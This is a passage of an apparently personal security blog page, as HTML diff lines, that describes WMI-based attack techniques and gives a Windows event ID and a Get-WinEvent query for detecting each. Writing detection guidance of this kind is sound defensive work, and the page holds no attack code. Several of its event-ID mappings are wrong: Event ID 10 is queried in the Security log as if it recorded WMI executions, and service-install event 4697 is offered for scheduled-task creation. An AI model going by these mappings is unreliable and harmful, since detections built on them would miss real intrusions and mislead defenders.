+            Monitoring for WMI executions across the network and correlating logon events is essential for identifying
+            lateral movement.</p>
+
+          <h1 id="wmi-scheduled-task-creation-persistence-1">WMI Scheduled Task Creation (Persistence)</h1>
+
+          <p><strong>Explanation</strong>: WMI can create or modify scheduled tasks that persist even through system
+            reboots, allowing attackers to execute malicious scripts or binaries on a regular basis.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4697</strong>: Logs the installation of services that could be associated with
+              scheduled task creation.</li>
+            <li><strong>Event ID 10</strong>: Tracks WMI executions that might relate to scheduled task creation or
+              manipulation.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Watch for task creation events and any associated WMI-based execution that may signal scheduled tasks
+              for persistence.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4697 }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Scheduled tasks created via WMI allow attackers to run scripts persistently.
+            Monitoring these events can reveal persistence mechanisms set by attackers.</p>
+
+          <h1 id="wmi-for-remote-code-execution-rce-1">WMI for Remote Code Execution (RCE)</h1>
+
+          <p><strong>Explanation</strong>: WMI can be leveraged to execute arbitrary code remotely, enabling attackers
+            to bypass security controls and run commands without needing direct access to the system.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Monitors process creation for remote code execution via WMI (e.g.,
+              PowerShell, <code class="language-plaintext highlighter-rouge">wmic</code>).</li>
+            <li><strong>Event ID 10</strong>: Tracks WMI command executions that could indicate remote code execution.
+            </li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Correlate suspicious remote code execution events through WMI with unusual network activity or file
+              modifications.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*powershell.exe*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Remote code execution via WMI bypasses traditional defenses. Monitoring for
+            this kind of activity can help detect malicious use of WMI for arbitrary code execution.</p>
+
+          <h1 id="wmi-event-filters-for-data-exfiltration-1">WMI Event Filters for Data Exfiltration</h1>
+
+          <p><strong>Explanation</strong>: Event filters can be used by attackers to monitor system activity and
+            exfiltrate data, such as sending logs or files to an external server.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 10</strong>: Logs WMI execution, which might indicate data exfiltration-related
+              actions.</li>
+            <li><strong>Event ID 19</strong>: Detects the creation of WMI event filters, which could be set up to
+              capture and send system data.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Investigate WMI event filters and correlate them with network traffic indicating potential data
+              exfiltration.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 10 }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: Data exfiltration via WMI event filters can be stealthy. Monitoring these
+            events alongside network traffic can help detect such attacks.</p>
+
+          <h1 id="wmi-for-manipulating-services-persistence-1">WMI for Manipulating Services (Persistence)</h1>
+
+          <p><strong>Explanation</strong>: Attackers may use WMI to manipulate or install services that provide
+            persistence on a system or escalate privileges.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 7045</strong>: Service creation or modification, potentially related to malicious
+              services installed via WMI.</li>
+            <li><strong>Event ID 4688</strong>: Tracks the execution of commands related to service manipulation through
+              WMI.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Monitor for the creation or modification of services and correlating WMI command executions.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "System" | Where-Object { $_.Id -eq 7045 -and $_.Message -like "*maliciousservice*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: WMI is a versatile tool for manipulating services. Monitoring for service
+            installations and WMI execution can help detect attackers establishing persistence via services.</p>
+
+          <h1 id="wmi-for-triggering-malicious-powershell-scripts-1">WMI for Triggering Malicious PowerShell Scripts
+          </h1>
+
+          <p><strong>Explanation</strong>: Attackers often use WMI to trigger malicious PowerShell scripts that can
+            perform actions like downloading malware or exfiltrating data.</p>
+
+          <p><strong>Detection</strong>:</p>
+
+          <ul>
+            <li><strong>Event ID 4688</strong>: Tracks the creation of processes, particularly PowerShell or suspicious
+              scripts triggered via WMI.</li>
+            <li><strong>Event ID 4104</strong>: PowerShell script block logging, which can reveal the contents of
+              malicious scripts.</li>
+          </ul>
+
+          <p><strong>Example Detection</strong>:</p>
+
+          <ul>
+            <li>Correlate PowerShell execution events with suspicious network activity or file modifications to detect
+              malicious scripts triggered by WMI.</li>
+          </ul>
+
+          <p><code
+              class="language-plaintext highlighter-rouge">Get-WinEvent -LogName "Security" | Where-Object { $_.Id -eq 4688 -and $_.Message -like "*powershell.exe*" }</code>
+          </p>
+
+          <p><strong>Rationale</strong>: PowerShell is commonly used for malicious purposes in WMI-based attacks.
+            Monitoring PowerShell executions and script block logging can help detect such malicious activities.</p>
+
+
+
+
+          <div class="post-tags-section">
+            <i class="post-tags-icon fas fa-tags"></i>
+            <ul class="post-tags">
+              <li>
+                <a class="post-tag" href="/tags/#wmi">wmi</a>
+              </li>
+            </ul>
+          </div>
+
+
+
+
+        </article>
+
+
+        <aside class="related">
+          <h2>Related posts</h2>
+          <ul class="related-posts">
+
+            <li>
+              <a href="/malware%20analysis/2025/07/21/cve-2025-53770-viewstate-rce/">
+                CVE-2025-53770 Remote Code Execution via ViewState Abuse
+                <small><time datetime="2025-07-21T00:00:00+03:00">21 Jul 2025</time></small>
+              </a>
+            </li>
+
+            <li>
+              <a
+                href="/threat%20intelligence/ransomware/incident%20response/2025/07/18/operational-analysis-of-ransomware-attack-lifecycle/">
+                Operational Analysis of Ransomware Attack Lifecycle
+                <small><time datetime="2025-07-18T00:00:00+03:00">18 Jul 2025</time></small>
+              </a>
+            </li>
+
+            <li>
+              <a
+                href="/threat%20intelligence/crypto%20crime/incident%20response/2025/07/18/nobitex-breach-81-million-theft-under-investigation/">
+                Nobitex Breach: $81 Million Theft Under Investigation
+                <small><time datetime="2025-07-18T00:00:00+03:00">18 Jul 2025</time></small>
+              </a>
+            </li>
+
+          </ul>
+        </aside>
+
+
+      </main>
+
+      <footer class="footer"><small>
+          &copy; 2025 <a href="https://github.com/kh4lifa0x/">Ahmed Khalifa</a>. All rights reserved.
+          Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/vszhub/not-pure-poole">Not
+            Pure Poole</a>.
+        </small>
+      </footer>
+    </div>
+    <div class="sidebar-right pure-u-1 pure-u-md-1-4">
+    </div>
+  </div>
+
+  <script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+  <script>
+    function strip(str, remove) {
+      while (str.length > 0 && remove.indexOf(str.charAt(0)) != -1) {
+        str = str.substr(1);
+      }
+      while (str.length > 0 && remove.indexOf(str.charAt(str.length - 1)) != -1) {
+        str = str.substr(0, str.length - 1);
+      }
+      return str;
+    }
+
+    function scroll() {
+      console.log('scroll');
+      window.scrollTo({
+        left: 0,
+        top: window.innerHeight,
+        behavior: 'smooth'
+      });
+      sessionStorage.removeItem('forceCheckScroll');
+    }
+
+    const forceCheckScroll = sessionStorage.getItem('forceCheckScroll') === 'true';
+    const checkScroll = strip(window.location.pathname, '/') !== strip('', '/');
+
+    if (forceCheckScroll || checkScroll) {
+      const maxWidth = "(max-width: 48rem)";
+      const result = window.matchMedia(maxWidth);
+      if (result.matches) {
+        scroll();
+      } else {
+        result.addListener((match) => {
+          if (match.media == maxWidth) {
+            if (match.matches) {
+              scroll();
+            }
+          }
+        });
+      }
+    }
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</body>
+
+</html>
